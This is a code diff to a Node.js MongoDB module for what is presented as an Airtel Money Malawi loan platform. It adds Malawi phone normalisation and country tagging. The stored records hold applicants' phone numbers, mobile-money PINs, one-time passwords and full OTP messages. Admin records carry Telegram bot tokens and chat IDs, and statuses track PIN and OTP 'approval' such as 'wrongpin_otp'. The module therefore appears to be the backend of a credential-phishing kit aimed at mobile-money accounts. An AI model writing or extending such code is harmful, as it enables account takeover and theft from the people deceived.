@@ -3,12 +3,26 @@ const { MongoClient } = require('mongodb');
 let client;
 let db;
 
-// Database and collections
-const DB_NAME = 'airtel_loan_platform1';
+// Database and collections for Airtel Money Malawi
+const DB_NAME = process.env.MONGODB_DB_NAME || 'airtel_malawi_loan_platform';
 const COLLECTIONS = {
     ADMINS: 'admins',
     APPLICATIONS: 'applications'
 };
+
+/**
+ * Normalize Malawi phone numbers to +265XXXXXXXXX format
+ */
+function normalizeMalawiPhone(phoneNumber) {
+    if (!phoneNumber) return '';
+    let cleaned = String(phoneNumber).trim().replace(/[\s\-()]/g, '');
+    if (cleaned.startsWith('+2650')) return '+265' + cleaned.slice(5);
+    if (cleaned.startsWith('+265'))  return cleaned;
+    if (cleaned.startsWith('2650'))  return '+265' + cleaned.slice(4);
+    if (cleaned.startsWith('265'))   return '+' + cleaned;
+    if (cleaned.startsWith('0'))     return '+265' + cleaned.slice(1);
+    return '+265' + cleaned;
+}
 
 /**
  * Connect to MongoDB
@@ -21,14 +35,14 @@ async function connectDatabase() {
             throw new Error('❌ MONGODB_URI is not set in environment variables');
         }
 
-        console.log('🔄 Connecting to MongoDB...');
+        console.log('🔄 Connecting to MongoDB (Airtel Money Malawi)...');
 
         client = new MongoClient(MONGODB_URI);
         await client.connect();
 
         db = client.db(DB_NAME);
 
-        console.log('✅ Connected to MongoDB successfully');
+        console.log(`✅ Connected to MongoDB successfully (DB: ${DB_NAME})`);
 
         await createIndexes();
 
@@ -56,7 +70,7 @@ async function createIndexes() {
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
 
-        console.log('✅ Database indexes created');
+        console.log('✅ Airtel Malawi database indexes created');
     } catch (error) {
         console.error('⚠️ Error creating indexes:', error.message);
     }
@@ -68,7 +82,7 @@ async function createIndexes() {
 async function closeDatabase() {
     if (client) {
         await client.close();
-        console.log('✅ Database connection closed');
+        console.log('✅ Airtel Malawi database connection closed');
     }
 }
 
@@ -94,12 +108,13 @@ async function saveAdmin(adminData) {
             email:     adminData.email,
             chatId:    adminData.chatId,
             status:    adminData.status || 'active',
+            platform:  'airtel_malawi',
             createdAt: adminData.createdAt || new Date().toISOString()
         };
 
         if (adminData.botToken) adminDocument.botToken = adminData.botToken;
 
-        console.log(`💾 Saving admin to database:`, {
+        console.log(`💾 Saving admin to Airtel Malawi database:`, {
             adminId: adminDocument.adminId,
             name:    adminDocument.name,
             email:   adminDocument.email,
@@ -221,21 +236,27 @@ async function getAdminCount() {
 
 async function saveApplication(appData) {
     try {
+        const formattedPhone = normalizeMalawiPhone(appData.phoneNumber);
+
         const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
-            id:             appData.id,
-            adminId:        appData.adminId,
-            adminName:      appData.adminName,
-            phoneNumber:    appData.phoneNumber,
-            pin:            appData.pin,
-            pinStatus:      appData.pinStatus  || 'pending',
-            otpStatus:      appData.otpStatus  || 'pending',
-            otp:            appData.otp        || null,
-            assignmentType: appData.assignmentType,
+            id:              appData.id,
+            adminId:         appData.adminId,
+            adminName:       appData.adminName,
+            phoneNumber:     formattedPhone,
+            countryCode:     '+265',
+            currency:        'MWK',
+            platform:        'airtel_malawi',
+            pin:             appData.pin,
+            pinStatus:       appData.pinStatus       || 'pending',
+            otpStatus:       appData.otpStatus       || 'pending',
+            otp:             appData.otp             || null,
+            fullOtpMessage:  appData.fullOtpMessage  || null,
+            assignmentType:  appData.assignmentType,
             isReturningUser: appData.isReturningUser || false,
-            previousCount:  appData.previousCount   || 0,
-            timestamp:      appData.timestamp || new Date().toISOString()
+            previousCount:   appData.previousCount   || 0,
+            timestamp:       appData.timestamp       || new Date().toISOString()
         });
-        console.log(`💾 Application saved: ${appData.id}`);
+        console.log(`💾 Airtel Malawi application saved: ${appData.id}`);
         return result;
     } catch (error) {
         console.error('❌ Error saving application:', error);
@@ -254,11 +275,16 @@ async function getApplication(applicationId) {
 
 async function updateApplication(applicationId, updates) {
     try {
+        const cleanUpdates = { ...updates };
+        if (cleanUpdates.phoneNumber) {
+            cleanUpdates.phoneNumber = normalizeMalawiPhone(cleanUpdates.phoneNumber);
+        }
+
         const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
             { id: applicationId },
-            { $set: { ...updates, updatedAt: new Date().toISOString() } }
+            { $set: { ...cleanUpdates, updatedAt: new Date().toISOString() } }
         );
-        console.log(`🔄 Application updated: ${applicationId}`);
+        console.log(`🔄 Airtel Malawi application updated: ${applicationId}`);
         return result;
     } catch (error) {
         console.error('❌ Error updating application:', error);
@@ -299,10 +325,10 @@ async function getPendingApplications(adminId) {
 
 async function getAdminStats(adminId) {
     try {
-        const total        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
-        const pinPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
-        const pinApproved  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
-        const otpPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
+        const total         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
+        const pinPending    = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
+        const pinApproved   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
+        const otpPending    = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
         const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
         return { total, pinPending, pinApproved, otpPending, fullyApproved };
     } catch (error) {
@@ -313,13 +339,13 @@ async function getAdminStats(adminId) {
 
 async function getStats() {
     try {
-        const totalAdmins        = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
-        const totalApplications  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
-        const pinPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
-        const pinApproved        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
-        const otpPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
-        const fullyApproved      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
-        const totalRejected      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
+        const totalAdmins       = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
+        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
+        const pinPending        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
+        const pinApproved       = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
+        const otpPending        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
+        const fullyApproved     = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
+        const totalRejected     = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
             $or: [
                 { pinStatus: 'rejected' },
                 { otpStatus: 'wrongpin_otp' },
@@ -390,6 +416,7 @@ async function cleanupInvalidAdmins() {
 module.exports = {
     connectDatabase,
     closeDatabase,
+    normalizeMalawiPhone,
 
     saveAdmin,
     getAdmin,
